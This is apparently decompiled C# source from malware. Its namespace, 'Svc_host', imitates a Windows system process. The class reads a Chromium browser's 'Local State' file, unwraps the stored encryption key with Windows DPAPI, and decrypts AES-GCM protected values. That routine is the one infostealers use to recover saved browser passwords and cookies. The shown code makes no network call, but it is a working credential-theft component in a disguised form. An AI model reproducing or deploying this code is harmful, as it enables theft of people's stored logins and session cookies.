using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Svc_host;

internal class Decryption
{
	public static byte[] _getKey(string path)
	{
		if (!File.Exists(path))
		{
			return null;
		}
		string text = File.ReadAllText(path);
		byte[] array = null;
		try
		{
			text = ((object)JObject.Parse(text).get_Item("os_crypt").get_Item((object)"encrypted_key")).ToString();
			return ProtectedData.Unprotect(Convert.FromBase64String(text).Skip(5).ToArray(), (byte[])null, (DataProtectionScope)1);
		}
		catch
		{
			return null;
		}
	}

	public static string _decryptWithKey(byte[] message, byte[] key, int nonSecretPayloadLength)
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Expected O, but got Unknown
		if (key != null && key.Length == 32)
		{
			if (message != null && message.Length != 0)
			{
				using (MemoryStream input = new MemoryStream(message))
				{
					using BinaryReader binaryReader = new BinaryReader(input);
					binaryReader.ReadBytes(nonSecretPayloadLength);
					byte[] array = binaryReader.ReadBytes(12);
					GcmBlockCipher val = new GcmBlockCipher((IBlockCipher)new AesEngine());
					AeadParameters val2 = new AeadParameters(new KeyParameter(key), 128, array);
					val.Init(false, (ICipherParameters)(object)val2);
					byte[] array2 = binaryReader.ReadBytes(message.Length);
					byte[] array3 = new byte[val.GetOutputSize(array2.Length)];
					try
					{
						int num = val.ProcessBytes(array2, 0, array2.Length, array3, 0);
						val.DoFinal(array3, num);
					}
					catch
					{
						return "";
					}
					return Encoding.Default.GetString(array3);
				}
			}
			throw new ArgumentException("Message required!", "message");
		}
		throw new ArgumentException($"Key needs to be {256} bit!", "key");
	}
}
